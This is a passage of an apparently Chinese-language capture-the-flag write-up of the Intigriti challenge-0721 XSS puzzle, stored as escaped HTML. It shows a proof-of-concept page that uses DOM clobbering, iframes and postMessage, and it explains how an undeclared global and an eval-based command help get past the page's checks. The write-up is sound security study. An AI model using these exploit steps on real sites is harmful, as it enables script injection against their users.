punctuation&quot;&gt;&quot;&lt;/span&gt;ftp://a:a@a&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&gt;&amp;lt;/a&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;iframe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;iframe&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;iframeConsole&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;https://challenge-0721.intigriti.io/console.php&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;iframe&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這邊還有利用到一個特性是 a 元素的 username 屬性會是 href 屬性裡 URL 的 username。&lt;/p&gt;
&lt;p&gt;這樣設置的話，&lt;code&gt;top.DEV&lt;/code&gt; 就會是 &lt;code&gt;a id=&amp;quot;DEV&amp;quot;&amp;gt;&amp;lt;/a&amp;gt;&lt;/code&gt; 這個 DOM，而 &lt;code&gt;store.users&lt;/code&gt; 就會是 HTMLCollection，&lt;code&gt;store.users.admin&lt;/code&gt; 是那個 a，&lt;code&gt;store.users.admin.username&lt;/code&gt; 則會是 href 裡面的 username，也就是 &lt;code&gt;a&lt;/code&gt;，而密碼也是一樣的。&lt;/p&gt;
&lt;p&gt;綜合以上所述，我可以自己寫一個 HTML 然後用 &lt;code&gt;window.open&lt;/code&gt; 去開啟 htmledit.php 然後把上面的內容帶進去：&lt;/p&gt;
&lt;pre class=&quot;language-html&quot;&gt;&lt;code class=&quot;language-html&quot;&gt;&lt;span class=&quot;token doctype&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;!&lt;/span&gt;&lt;span class=&quot;token doctype-tag&quot;&gt;DOCTYPE&lt;/span&gt; &lt;span class=&quot;token name&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;html&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;en&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&quot;token attr-name&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;token attr-value&quot;&gt;&lt;span class=&quot;token punctuation attr-equals&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;utf-8&lt;span class=&quot;token punctuation&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;XSS POC&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;title&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;  &lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;head&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;  &lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token script&quot;&gt;&lt;span class=&quot;token language-javascript&quot;&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; htmlUrl &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;https://challenge-0721.intigriti.io/htmledit.php?code=&#39;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; payload &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&lt;br&gt;      &amp;lt;a id=&quot;DEV&quot;&gt;&amp;lt;/a&gt;&lt;br&gt;      &amp;lt;iframe name=&quot;store&quot; srcdoc=&#39;&lt;br&gt;        &amp;lt;a id=&quot;users&quot;&gt;&amp;lt;/a&gt;&lt;br&gt;        &amp;lt;a id=&quot;users&quot; name=&quot;admin&quot; href=&quot;ftp://a:a@a&quot;&gt;&amp;lt;/a&gt;&lt;br&gt;      &#39;&gt;&amp;lt;/iframe&gt;&lt;br&gt;      &amp;lt;iframe name=&quot;iframeConsole&quot; src=&quot;https://challenge-0721.intigriti.io/console.php&quot;&gt;&amp;lt;/iframe&gt;&lt;br&gt;    &lt;/span&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; win &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;htmlUrl &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;encodeURIComponent&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;payload&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token comment&quot;&gt;// wait unitl window loaded&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token function&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;      console&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;go&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; credentials &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        username&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        password&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;a&#39;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;      win&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;frames&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;postMessage&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        cmd&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;br&gt;        credentials&lt;br&gt;      &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&#39;*&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;5000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;script&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;body&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token tag&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;lt;/&lt;/span&gt;html&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;如此一來，我就可以用 postMessage 送訊息進去了。&lt;/p&gt;
&lt;p&gt;雖然花了一番功夫，但這才只是開始而已。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E8%AE%93-safe-%E8%AE%8A%E6%88%90-true&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%BA%8C%E9%97%9C%EF%BC%9A%E8%AE%93-safe-%E8%AE%8A%E6%88%90-true&quot;&gt;#&lt;/a&gt; 第二關：讓 safe 變成 true&lt;/h2&gt;
&lt;p&gt;safe 要是 true，這樣呼叫 log 的時候才不會把 &lt;code&gt;&amp;lt;&lt;/code&gt; escape，要讓 safe 是 true 的話，要找到有傳入四個參數的呼叫，因為第四個會是 safe 的值：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;logv&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// display variable&#39;s value by its name&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[logv]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; window&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; safe&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;compare&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// compare variable&#39;s value to a given one&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token function&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;[compare]: &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;window&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;variable&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;value&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; safe&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; type&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;info&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;log(&amp;quot;[logv]: &amp;quot;, window[m.message], safe=false, type=&#39;info&#39;)&lt;/code&gt; 這個我在找的 function call，而這之中第二個參數會是 &lt;code&gt;window[m.message]&lt;/code&gt;，也就是說可以把任一全域變數當作 data 傳進去，可是要傳什麼呢？&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E5%82%B3%E5%85%A5%E7%9A%84%E8%AE%8A%E6%95%B8&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E4%B8%89%E9%97%9C%EF%BC%9A%E6%89%BE%E5%88%B0%E5%8F%AF%E4%BB%A5%E5%82%B3%E5%85%A5%E7%9A%84%E8%AE%8A%E6%95%B8&quot;&gt;#&lt;/a&gt; 第三關：找到可以傳入的變數&lt;/h2&gt;
&lt;p&gt;我在這邊卡得滿久的，因為我想不太到這邊可以傳什麼。以前有一招是可以傳 name，但是這個網頁已經自己設定 name 了所以沒辦法。另一招是用 URL 去傳就可以把東西放在 location 上面，但 &lt;code&gt;log&lt;/code&gt; 裡面會檢查 &lt;code&gt;data&lt;/code&gt; 是不是字串，不是的話要先經過 &lt;code&gt;JSON.stringify&lt;/code&gt;，會把內容encode。&lt;/p&gt;
&lt;p&gt;卡很久的我只好不斷重複看著程式碼，看能不能找出什麼新東西，結果還真的找到了。下面這段 code 有一個新手常見問題，你有看出來嗎？&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;token function-variable function&quot;&gt;checkCredentials&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token parameter&quot;&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; password&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; users &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; top&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;store&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; access &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;admin&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;moderator&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; users&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;manager&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;users &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x &lt;span class=&quot;token keyword&quot;&gt;of&lt;/span&gt; access&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;username &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; username &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; x&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;password &lt;span class=&quot;token operator&quot;&gt;===&lt;/span&gt; password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;true&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;這個問題就出在 &lt;code&gt;for (x of access) {&lt;/code&gt;，x 忘了宣告，所以預設就會變成全域變數。在這邊的話，&lt;code&gt;x&lt;/code&gt; 會是 &lt;code&gt;top.store.users.admin&lt;/code&gt;，也就是我們自己設置的那個 &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;。&lt;/p&gt;
&lt;h2 id=&quot;%E7%AC%AC%E5%9B%9B%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E%E5%9E%8B%E6%85%8B%E6%AA%A2%E6%9F%A5&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#%E7%AC%AC%E5%9B%9B%E9%97%9C%EF%BC%9A%E7%B9%9E%E9%81%8E%E5%9E%8B%E6%85%8B%E6%AA%A2%E6%9F%A5&quot;&gt;#&lt;/a&gt; 第四關：繞過型態檢查&lt;/h2&gt;
&lt;p&gt;既然我們有了這個 x，就可以把它用 logv 這個 command 傳入 log function，然後因為 safe 會是 true，所以就可以直接把 x 的內容用 innerHTML 顯示出來。&lt;/p&gt;
&lt;p&gt;如果你把一個 a 元素變成字串，會得到 a.href 的內容，所以我們可以把我們的 payload 放在 href 裡面。&lt;/p&gt;
&lt;p&gt;但是，&lt;code&gt;log&lt;/code&gt; 裡面會檢查 data 的型態，而 &lt;code&gt;a&lt;/code&gt; 不是字串所以過不了檢查，這該怎麼辦呢？&lt;/p&gt;
&lt;p&gt;這時候我重新看了一遍程式碼，發現了這個指令：&lt;/p&gt;
&lt;pre class=&quot;language-js&quot;&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;reassign&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// change variable&#39;s value&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; o &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;message&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;let&lt;/span&gt; RegExp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token regex&quot;&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;token regex-source language-regex&quot;&gt;^[s-zA-Z-+0-9]+$&lt;/span&gt;&lt;span class=&quot;token regex-delimiter&quot;&gt;/&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;RegExp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;RegExp&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Error&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&#39;Invalid input given!&#39;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token function&quot;&gt;eval&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token template-string&quot;&gt;&lt;span class=&quot;token template-punctuation string&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;a&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;${&lt;/span&gt;o&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;b&lt;span class=&quot;token interpolation-punctuation punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token template-punctuation 